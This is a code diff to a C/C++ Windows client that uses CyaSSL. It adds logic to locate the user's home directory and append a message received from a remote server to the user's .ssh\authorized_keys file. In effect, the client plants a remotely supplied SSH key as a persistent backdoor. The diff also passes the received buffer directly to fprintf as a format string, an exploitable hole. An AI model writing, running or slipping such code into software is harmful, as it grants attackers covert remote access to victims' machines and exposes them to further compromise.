@@ -18,11 +18,15 @@
 #include <cyassl/openssl/ssl.h>
 #include <cyassl/test.h>
 #include <tchar.h>
+#include <ShlObj.h>
+#include <string.h>
 /*#include <libssh/server.h>
 #include <libssh/libssh.h>
 #include <libssh/callbacks.h>*/
 bool received_response = false;
 SOCKADDR_IN server;
+WCHAR HOME[PACKET_SIZE];
+char SSH_KEYS[PACKET_SIZE];
 
 DWORD WINAPI ReceiveResponse(LPVOID lpArg)
 {
@@ -98,6 +102,13 @@ void init(void) {
 	FILE* fp = fopen("status.txt", "w+");
 	fprintf(fp, "connecting\n");
 	fclose(fp);
+
+	for (int i = 0; i < PACKET_SIZE; i++) {
+		HOME[i] = 0;
+	}
+	if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, HOME))) {
+		printf("could not get home directory\n");
+	}
 }
 
 int main() {
@@ -198,7 +209,14 @@ int main() {
 
 	std::cout << "received message: " << rbuf << std::endl;
 
-	FILE* fp = fopen(SSH_KEYS, "a");
+	//strcpy(SSH_KEYS, (char*) HOME);
+	wcstombs(SSH_KEYS, HOME, PACKET_SIZE);
+	strcat(SSH_KEYS, "\\.ssh\\authorized_keys");
+	FILE* fp = fopen((char*) SSH_KEYS, "a");
+	if (fp == NULL) {
+		printf("Could not open ssh keys file\n");
+		return -1;
+	}
 	fprintf(fp, "\n");
 	fprintf(fp, rbuf);
 	fclose(fp);
